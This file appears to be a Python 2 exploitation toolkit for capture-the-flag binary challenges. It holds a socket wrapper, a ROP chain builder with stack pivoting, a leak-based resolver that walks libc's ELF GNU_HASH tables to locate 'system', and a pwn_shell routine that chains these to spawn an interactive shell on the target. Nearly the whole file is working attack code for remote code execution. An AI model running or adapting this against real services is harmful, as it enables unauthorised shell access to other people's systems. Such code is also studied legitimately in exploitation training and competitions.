import socket
import select
import sys
import struct
import time

class service:
  iobuf = ''
  rop_size = 256

  def connect(self, ip, port):
    self.r = socket.create_connection((ip, port), timeout=1)

  def close(self):
    self.r.close()
  
  def seek(self):
    x = self.r.recv(4096)
    if not x:
      raise socket.timeout
    self.iobuf += x

  def recv(self, timeout=0.2):
    tm = self.r.gettimeout()
    self.r.settimeout(timeout)
    try:
      while True:
        self.seek()
    except socket.timeout:
      tmp = self.iobuf
      self.iobuf = ''
    self.r.settimeout(tm)
    return tmp

  def recvn(self, n):
    while len(self.iobuf)<n:
      self.seek()
    tmp = self.iobuf[:n]
    self.iobuf = self.iobuf[n:]
    return tmp

  def recvuntil(self, x):
    while x not in self.iobuf:
      self.seek()
    i = self.iobuf.find(x) + len(x)
    tmp = self.iobuf[:i]
    self.iobuf = self.iobuf[i:]
    return tmp

  def send(self, x):
    self.r.send(x)

  def interact(self):
    rfd = self.r.fileno()
    while True:
      rlist, wlist, xlist = select.select((0, rfd), (), ())
      if rfd in rlist:
        x = self.r.recv(4096)
        if len(x)==0:
          break
        sys.stdout.write(x)
        sys.stdout.flush()
      if 0 in rlist:
        self.send(raw_input()+'\n')

  def rop_setup(self, read, write, leave, buf, pop_bx_si_di_bp):
    self.rop_read = read
    self.rop_write = write
    self.rop_buf1 = buf
    self.rop_buf2 = buf + self.rop_size
    self.ret = pop_bx_si_di_bp + 4
    self.leave = leave
    self.pop_bp = pop_bx_si_di_bp + 3
    return (self.rop_call(self.rop_read, [0, self.rop_buf1, self.rop_size]) +
        self.rop_migrate(self.rop_buf1))
  
  def rop_call(self, func, args):
    return p32(func) + p32(self.ret - len(args)) + ''.join(map(p32, args))

  def rop_migrate(self, addr):
    return p32(self.pop_bp) + p32(addr - 4) + p32(self.leave)

  def rop(self, chain, wait=0.2):
    self.rop_buf1, self.rop_buf2 = self.rop_buf2, self.rop_buf1
    self.send(chain + 
        self.rop_call(self.rop_read, [0, self.rop_buf1, self.rop_size]) +
        self.rop_migrate(self.rop_buf1))
    time.sleep(wait)
  
  def pwn_shell(self):
    # leaker function
    def leak(addr, n):
      self.rop(self.rop_call(self.rop_write, [1, addr, n]), wait=0)
      return self.recvn(n)

    # An address in libc. We use write@.got.plt
    ptr = u32(leak(self.rop_write + 2, 4))
    ptr = u32(leak(ptr, 4))
    system = resolve_symbol(leak, ptr, 'system')
    
    cmd = self.rop_buf1 + 128
    self.rop(self.rop_call(self.rop_read, [0, cmd, 10]))
    time.sleep(0.5)
    self.send('sh\x00')
    time.sleep(0.5)
    self.rop(self.rop_call(system, [cmd]))
    print 'Pwn2sh!'
    self.interact()


def ruler(length, alphabet='ABCDEFGHIJKLMNO', n=4):
  import operator
  """
  De Bruijn sequence for alphabet k
  and subsequences of length n.

  https://en.wikipedia.org/wiki/De_Bruijn_sequence
  """
  k = len(alphabet)
  a = [0] * k * n
  sequence = []
  def db(t, p):
    if t > n:
      if n % p == 0:
        for j in range(1, p + 1):
          sequence.append(a[j])
          if len(sequence)==length:
            return True
      return False
    else:
      a[t] = a[t - p]
      if db(t + 1, p):
        return True
      for j in range(a[t - p] + 1, k):
        a[t] = j
        if db(t + 1, t):
          return True
      return False
  db(1, 1)
  return "".join(map(alphabet.__getitem__, sequence))

def p32(x):
  return struct.pack('I', x&0xffffffff)

def u32(x):
  return struct.unpack('I', x.ljust(4, '\x00'))[0]

def p16(x):
  return struct.pack('H', x&0xffff)

def u16(x):
  return struct.unpack('H', x.ljust(2, '\x00'))[0]


def resolve_symbol(leak, ptr, symbol):
  '''
  http://sp1.wikidot.com/elfobjfile
  https://blogs.oracle.com/ali/entry/gnu_hash_elf_sections
  https://github.com/Gallopsled/pwntools/blob/6225901ba8/pwnlib/dynelf.py

  ELF32 GNU_HASH only

  '''
  
  # find libc base
  ptr = ptr & 0xfffff000
  while True:
    magic = leak(ptr, 4)
    if magic=='\x7fELF':
      base = ptr
      break
    ptr -= 0x1000
  print 'libc @', hex(base)

  # find DYNAMIC from program header
  phoff = u32(leak(base + 0x1c, 4))
  phnum = u16(leak(base + 0x2c, 2))
  for i in range(phnum):
    if u32(leak(base + phoff + i*32, 4))==2: #DYNAMIC
      dynoff = u32(leak(base + phoff + i*32 + 0x4, 4))
      break
  dyn = base + dynoff
  print 'DYNAMIC @', hex(dyn)

  # extract STRTAB, SYMTAB, GNU_HASH
  off = 0
  strtab = None
  symtab = None
  gnu_hash = None
  while True:
    ent = leak(dyn + off, 8)
    tag = u32(ent[0:4])
    val = u32(ent[4:8])
    if val < 0x400000: # we get offset but not address
      val += base
    if tag==0:
      break
    elif tag==0x5:
      strtab = val
    elif tag==0x6:
      symtab = val
    elif tag==0x6ffffef5:
      gnu_hash = val
    if strtab and symtab and gnu_hash:
      break
    off += 8
  print 'STRTAB @', hex(strtab)
  print 'SYMTAB @', hex(symtab)
  print 'GNU_HASH @', hex(gnu_hash)

  ent = leak(gnu_hash, 16)
  nbuckets = u32(ent[0:4])
  symndx = u32(ent[4:8])
  maskwords_bm = u32(ent[8:12])
  shift2 = u32(ent[12:16])
  
  buckets = gnu_hash + 16 + maskwords_bm * 4
  chains = buckets + nbuckets * 4

  # calc symbol hash
  h = 5381
  for c in symbol:
    h = (h * 33 + ord(c))&0xffffffff
  print 'Resolving %s (%x) ...' % (symbol, h),

  # search symbol on hash chain
  ndx = u32(leak(buckets + (h % nbuckets) * 4, 4)) 
  t = chains + (ndx - symndx) * 4
  h2 = 0
  while not h2 & 1:
    h2 = u32(leak(t, 4))
    if (h&~1)==(h2&~1):
      sym = symtab + ndx*16
      index = u32(leak(sym, 4))
      if leak(strtab + index, len(symbol))==symbol:
        off = u32(leak(sym + 4, 4))
        print '0x%x (off = 0x%x)' % (base + off, off)
        return base + off
    t += 4
    ndx += 1
  return None

